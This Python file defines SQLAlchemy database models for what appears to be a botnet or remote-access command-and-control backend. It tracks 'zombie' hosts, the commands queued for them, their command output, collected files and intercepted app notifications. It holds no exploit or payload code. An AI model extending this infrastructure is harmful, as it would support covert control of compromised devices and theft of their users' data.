from typing import List

from sqlalchemy import String, ForeignKey, Text
from sqlalchemy.orm import Mapped, mapped_column, relationship

from apps.base.models import Base


class Zombie(Base):
    __tablename__ = "zombies"
    unique_key: Mapped[str] = mapped_column(String(1024), nullable=True, unique=True)
    os_name: Mapped[str] = mapped_column(
        String,
        nullable=False,
    )
    status: Mapped[str] = mapped_column(String, nullable=False, default="offline")
    commands: Mapped[List["Command"]] = relationship("Command", back_populates="zombie", cascade="all, delete-orphan")
    logs: Mapped[List["Log"]] = relationship("Log", back_populates="zombie", cascade="all, delete-orphan")
    files: Mapped[List["File"]] = relationship("File", back_populates="zombie", cascade="all, delete-orphan")
    notifications: Mapped[List["Notification"]] = relationship("Notification", back_populates="zombie",
                                                               cascade="all, delete-orphan")

    def __str__(self):
        return f"{self.os_name}"


class Command(Base):
    __tablename__ = "commands"

    zombie_id: Mapped[int] = mapped_column(ForeignKey('zombies.id'), nullable=False)
    command_type: Mapped[str] = mapped_column(String, nullable=False)
    status: Mapped[str] = mapped_column(String, nullable=False, default="pending")

    # Relationships
    zombie: Mapped["Zombie"] = relationship("Zombie", back_populates="commands")
    logs: Mapped[List["Log"]] = relationship("Log", back_populates="command", cascade="all, delete-orphan")
    files: Mapped[List["File"]] = relationship("File", back_populates="command", cascade="all, delete-orphan")

    def __str__(self):
        return f"{self.command_type}"


class Log(Base):
    __tablename__ = "logs"

    zombie_id: Mapped[int] = mapped_column(ForeignKey('zombies.id'), nullable=False)
    command_id: Mapped[int] = mapped_column(ForeignKey('commands.id'), nullable=False)
    output_data: Mapped[str] = mapped_column(Text, nullable=False)

    zombie: Mapped["Zombie"] = relationship("Zombie", back_populates="logs")
    command: Mapped["Command"] = relationship("Command", back_populates="logs")


class File(Base):
    __tablename__ = "files"
    name: Mapped[str] = mapped_column(String(250), nullable=True)
    file_path: Mapped[str] = mapped_column(String(1024), nullable=False)
    zombie_id: Mapped[int] = mapped_column(ForeignKey('zombies.id'), nullable=False)
    command_id: Mapped[int] = mapped_column(ForeignKey('commands.id'), nullable=False)
    zombie: Mapped["Zombie"] = relationship("Zombie", back_populates="files")
    command: Mapped["Command"] = relationship("Command", back_populates="files")

    def __str__(self):
        return f"{self.name} - {self.file_path}"


class Notification(Base):
    __tablename__ = "notifications"

    zombie_id: Mapped[int] = mapped_column(ForeignKey('zombies.id'), nullable=False)
    zombie: Mapped["Zombie"] = relationship("Zombie", back_populates="notifications")
    app_name: Mapped[str] = mapped_column(String, nullable=True)
    title: Mapped[str] = mapped_column(String, nullable=True)
    output_data: Mapped[str] = mapped_column(Text, nullable=False)

    def __str__(self):
        return f"{self.zombie} - {self.output_data[:150]}"
